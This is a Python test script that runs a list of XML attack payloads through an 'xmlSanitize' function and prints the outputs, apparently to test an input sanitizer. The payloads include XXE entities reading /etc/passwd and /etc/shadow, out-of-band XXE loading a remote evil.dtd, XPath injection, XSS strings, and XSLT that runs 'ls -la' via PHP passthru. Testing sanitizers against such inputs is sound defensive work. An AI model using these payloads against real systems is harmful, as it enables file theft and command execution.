import inputSanitizer as ips

payloads = [
    r'<?xml version="1.0" encoding="ISO-8859-1"?>',
    r'<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>',
    r'<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><test></test>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>',
    r'<test></test>',
    r'<![CDATA[<test></test>]]>',
    r'&foo;',
    r'%foo;',
    r"count(/child::node())",
    r"x' or name()='username' or 'x'='y",
    r"<name>','')); phpinfo(); exit;/*</name>",
    r'<![CDATA[<script>var n=0;while(true){n++;}</script>]]>',
    r'<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert("XSS");<![CDATA[<]]>/SCRIPT<![CDATA[>]]>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert("XSS");<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    r'<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert("XSS");<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
    r'<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[\' or 1=1 or \'\'=\']]></foo>',
    r'<foo><![CDATA[\' or 1=1 or \'\'=\']]></foo>',
    r'<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(\'XSS\');">]]>',
    r'''<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="''',
    r'<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
    r'<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
    r'<xml SRC="xsstest.xml" ID=I></xml>',
    r'<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>',
    r'<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">',
    r'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>',
    r'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>',
    r'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function(\'passthru\',\'ls -la\')"/></xsl:template></xsl:stylesheet>',
    r'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>',
    r'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>',
    r'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>',
    r'<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>',
    r'<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>',
    r'''<!ENTITY % int "<!ENTITY &''',
    r'''<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>''',
    r'''<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>'''
]




print("--- xmlSanitize test ediliyor ---\n")
for payload in payloads:
    try:
        sonuc = ips.xmlSanitize(payload)
        print(f"Payload: {payload!r} => Sanitized Output: {sonuc}")
    except Exception as e:
        print(f"Payload: {payload!r} => Error: {e}")